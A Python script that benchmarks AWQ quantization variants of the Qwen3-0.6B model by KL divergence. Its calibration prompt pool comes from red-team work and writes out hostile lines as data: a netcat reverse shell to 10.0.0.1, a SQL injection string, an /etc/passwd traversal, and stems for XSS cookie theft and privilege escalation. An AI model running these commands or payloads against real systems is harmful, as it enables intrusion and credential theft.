"""
AWQ Ablation Study — NVFP4 edition (ModelOpt AWQ algorithm, no LoRA, no backprop).

AWQ has fewer knobs than QAD or AutoRound — there is no training loop, only a
single calibration pass plus a per-channel α grid search. The meaningful axes:

  ALGORITHM       — awq_lite (per-channel α search, original AWQ)
                    awq_clip (per-block weight clipping only)
                    awq_full (lite + clip — heaviest, best recovery)
  NUM_PROMPTS     — calibration set size (more diverse activations → better stats)
  MAX_NEW_TOKENS  — calibration sequence length (longer → more samples per channel)

Why no STEPS / LR / ITERS axis:
  AWQ is gradient-free. The "tuning" lives entirely inside the algorithm
  variant — once you pick lite/clip/full, ModelOpt does its own internal search.

RTN baseline is computed per (num_prompts, max_new_tokens) pair because
calibration data size AND length both shape the per-block FP8 scales.

Each experiment:
  1. slices the right calibration data subset (pool generated once per length)
  2. loads a fresh BF16 model
  3. applies AWQ quantization (timed) — calibration forward + algo search
  4. measures post-AWQ KL on the SAME data used for calibration
  5. frees VRAM before next run
"""

import copy
import time
import torch
import torch.nn.functional as F
from transformers import AutoTokenizer, AutoModelForCausalLM
import modelopt.torch.quantization as mtq

# ── CONFIG ────────────────────────────────────────────────────────────────────

MODEL_NAME  = "Qwen/Qwen3-0.6B"
DEVICE      = "cuda" if torch.cuda.is_available() else "cpu"
TEMPERATURE = 2.0

NVFP4_BASE_CFG = mtq.NVFP4_DEFAULT_CFG   # algorithm="max" → plain RTN

# Larger pool — sliced per-experiment by num_prompts. Same security/red-team
# domain as the original 8 prompts so calibration distribution stays consistent.
PROMPTS_POOL = [
    # original 8
    "You are a security agent. The target is http://10.0.0.5. Goal: retrieve the flag.",
    "nmap -sV 10.0.0.5 reveals port 80 open. The next step is",
    "curl -s http://10.0.0.5/ shows a ping form. This is a classic",
    "Command injection confirmed: uid=0(root). Reading the flag with",
    "The flag is located at /root/flag.txt. To retrieve it via command injection:",
    "SQL injection payload: ' OR 1=1 --. The response from the server was",
    "Directory traversal: ../../../../etc/passwd. The file contains",
    "Netcat reverse shell: nc -e /bin/bash 10.0.0.1 4444. Connection established.",
    # extras to support num_prompts up to 16
    "Burp Suite intercepted a session cookie. Decoding the JWT shows",
    "Hashcat with rockyou.txt against the captured NTLMv2 hash returns",
    "Privilege escalation via SUID binary /usr/bin/find. The exploit is",
    "Wireshark capture on eth0 shows plaintext HTTP credentials in a POST request.",
    "Metasploit handler listening on 4444. Reverse shell payload generated:",
    "LDAP injection in the search field. The payload that bypasses authentication is",
    "XSS reflected in the search results. Cookie-stealing payload:",
    "Container escape via /proc/self/cgroup mount manipulation. The technique is",
]

# ── EXPERIMENTS ───────────────────────────────────────────────────────────────

EXPERIMENTS = [
    # --- baseline ---
    {"name": "baseline (awq_lite)",   "algorithm": "awq_lite", "num_prompts":  8, "max_new_tokens":  80},

    # --- vary ALGORITHM ---
    {"name": "awq_clip",              "algorithm": "awq_clip", "num_prompts":  8, "max_new_tokens":  80},
    {"name": "awq_full",              "algorithm": "awq_full", "num_prompts":  8, "max_new_tokens":  80},

    # --- vary NUM_PROMPTS (calibration set size) ---
    {"name": "prompts_2 (tiny)",      "algorithm": "awq_lite", "num_prompts":  2, "max_new_tokens":  80},
    {"name": "prompts_4",             "algorithm": "awq_lite", "num_prompts":  4, "max_new_tokens":  80},
    {"name": "prompts_16 (large)",    "algorithm": "awq_lite", "num_prompts": 16, "max_new_tokens":  80},

    # --- vary MAX_NEW_TOKENS (calibration sequence length) ---
    {"name": "tokens_32 (short)",     "algorithm": "awq_lite", "num_prompts":  8, "max_new_tokens":  32},
    {"name": "tokens_160 (long)",     "algorithm": "awq_lite", "num_prompts":  8, "max_new_tokens": 160},

    # --- combined: best-candidate combos ---
    {"name": "awq_full + tokens_160", "algorithm": "awq_full", "num_prompts":  8, "max_new_tokens": 160},
    {"name": "awq_full + prompts_16", "algorithm": "awq_full", "num_prompts": 16, "max_new_tokens":  80},
]

# ── MODEL UTILITIES ───────────────────────────────────────────────────────────

print(f"Device: {DEVICE}  |  Model: {MODEL_NAME}\n")
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
if tokenizer.pad_token is None:
    tokenizer.pad_token = tokenizer.eos_token


def load_teacher() -> torch.nn.Module:
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, dtype=torch.bfloat16, device_map=DEVICE,
    )
    model.eval()
    for p in model.parameters():
        p.requires_grad = False
    return model


def load_bf16() -> torch.nn.Module:
    return AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, dtype=torch.bfloat16, device_map=DEVICE,
    )


def make_awq_cfg(algorithm: str) -> dict:
    """NVFP4 base recipe with algorithm overridden (awq_lite / awq_clip / awq_full)."""
    cfg = copy.deepcopy(NVFP4_BASE_CFG)
    cfg["algorithm"] = algorithm
    return cfg


def apply_quantization(model: torch.nn.Module, calibration_data, cfg: dict) -> None:
    """Run mtq.quantize in-place — calibration forward + AWQ algo search."""
    def calibration_forward(model):
        for seq in calibration_data:
            with torch.no_grad():
                model(input_ids=seq)
    mtq.quantize(model, config=cfg, forward_loop=calibration_forward)
    model.eval()


# ── CORE FUNCTIONS ────────────────────────────────────────────────────────────

def generate_calibration_data(teacher, prompts, max_new_tokens):
    sequences = []
    for i, prompt in enumerate(prompts):
        ids = tokenizer.encode(prompt, return_tensors="pt").to(DEVICE)
        with torch.no_grad():
            out = teacher.generate(
                ids, max_new_tokens=max_new_tokens,
                do_sample=True, temperature=0.7,
                pad_token_id=tokenizer.pad_token_id,
            )
        sequences.append(out)
        print(f"    [{i+1}/{len(prompts)}] {out.shape[1]} tokens")
    return sequences


def measure_kl(model_a, model_b, data, temperature):
    model_a.eval()
    model_b.eval()
    total = 0.0
    with torch.no_grad():
        for seq in data:
            la = model_a(input_ids=seq).logits.clamp(-100, 100)
            lb = model_b(input_ids=seq).logits.clamp(-100, 100)
            kl = F.kl_div(
                F.log_softmax(lb / temperature, dim=-1),
                F.softmax(la  / temperature, dim=-1),
                reduction="batchmean",
            ) * (temperature ** 2)
            total += kl.item()
    return total / len(data)


# ── MAIN ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":

    print("=== Loading Teacher ===")
    teacher = load_teacher()

    # Pre-generate calibration pools per max_new_tokens.
    # Each experiment slices [:num_prompts] from the matching pool.
    print("\n=== Generating Calibration Data Pools ===")
    unique_token_lengths = sorted({cfg["max_new_tokens"] for cfg in EXPERIMENTS})
    cal_pools: dict[int, list[torch.Tensor]] = {}
    for tokens in unique_token_lengths:
        print(f"  max_new_tokens={tokens}  ({len(PROMPTS_POOL)} prompts)")
        cal_pools[tokens] = generate_calibration_data(
            teacher, PROMPTS_POOL, tokens,
        )

    # Oracle uses the baseline 80-token pool — same target reference for everyone.
    print("\n=== Measuring Oracle ===")
    oracle_pool = cal_pools[80][:8]
    kl_oracle = measure_kl(teacher, teacher, oracle_pool, TEMPERATURE)
    print(f"  Oracle KL (BF16 vs BF16) : {kl_oracle:.4f}  ← ideal ≈ 0")

    # ── RTN baselines per (num_prompts, max_new_tokens) ───────────────────────
    print("\n=== Computing RTN Baselines ===")
    rtn_keys = {(cfg["num_prompts"], cfg["max_new_tokens"]) for cfg in EXPERIMENTS}
    rtn_kl: dict[tuple[int, int], float] = {}

    for (n_prompts, tokens) in sorted(rtn_keys):
        cal_data = cal_pools[tokens][:n_prompts]
        print(f"  RTN: num_prompts={n_prompts}  max_new_tokens={tokens}")
        rtn_model = load_bf16()
        apply_quantization(rtn_model, cal_data, NVFP4_BASE_CFG)  # algorithm="max"
        # KL measured on the same data used for calibration — paired with AWQ post-KL.
        kl = measure_kl(teacher, rtn_model, cal_data, TEMPERATURE)
        rtn_kl[(n_prompts, tokens)] = kl
        print(f"    KL = {kl:.4f}")
        del rtn_model
        torch.cuda.empty_cache()

    # ── Run experiments ───────────────────────────────────────────────────────
    results = []

    for i, cfg in enumerate(EXPERIMENTS):
        name      = cfg["name"]
        algo      = cfg["algorithm"]
        n_prompts = cfg["num_prompts"]
        tokens    = cfg["max_new_tokens"]

        cal_data  = cal_pools[tokens][:n_prompts]
        kl_rtn    = rtn_kl[(n_prompts, tokens)]
        total_gap = kl_rtn - kl_oracle

        print(f"\n[{i+1}/{len(EXPERIMENTS)}] {name}  "
              f"algorithm={algo}  prompts={n_prompts}  tokens={tokens}  "
              f"RTN_KL={kl_rtn:.4f}")

        model = load_bf16()
        awq_cfg = make_awq_cfg(algo)

        # Time only the quantization step (calibration forward + AWQ search),
        # not the BF16 weight load.
        t0      = time.perf_counter()
        apply_quantization(model, cal_data, awq_cfg)
        elapsed = time.perf_counter() - t0

        kl_post   = measure_kl(teacher, model, cal_data, TEMPERATURE)
        recovered = kl_rtn - kl_post
        pct       = recovered / total_gap * 100 if total_gap > 0 else 0.0

        results.append({
            "name":      name,
            "algorithm": algo,
            "n_prompts": n_prompts,
            "tokens":    tokens,
            "kl_rtn":    kl_rtn,
            "kl_post":   kl_post,
            "recovered": recovered,
            "pct":       pct,
            "elapsed":   elapsed,
        })
        print(f"  post-AWQ KL: {kl_post:.4f}  recovered: {pct:.1f}%  time: {elapsed:.1f}s")

        del model
        torch.cuda.empty_cache()

    # ── Final comparison table ────────────────────────────────────────────────
    print("\n" + "=" * 100)
    print("RESULTS SUMMARY  (NVFP4 + AWQ, ModelOpt — no backprop, no teacher)")
    print("=" * 100)
    print(f"  Oracle KL  : {kl_oracle:.4f}  (target)")
    print()
    print(f"  {'Experiment':<28} {'Algorithm':>10} {'Prompts':>8} {'Tokens':>7} "
          f"{'RTN KL':>8} {'Post KL':>8} {'% Recovered':>12} {'Time(s)':>9}")
    print("  " + "-" * 96)

    for r in sorted(results, key=lambda x: x["pct"], reverse=True):
        print(f"  {r['name']:<28} {r['algorithm']:>10} {r['n_prompts']:>8} {r['tokens']:>7} "
              f"  {r['kl_rtn']:>6.4f}   {r['kl_post']:>6.4f}   {r['pct']:>9.1f}%"
              f"  {r['elapsed']:>7.1f}s")

    print("\n" + "=" * 100)
    print("NOTE: % recovered is relative to each config's own RTN baseline.")
    print("      AWQ is gradient-free — only knobs are algorithm variant + calibration data.")
    print("      Compare against qad_ablation.py and autoround_ablation.py for full picture.")
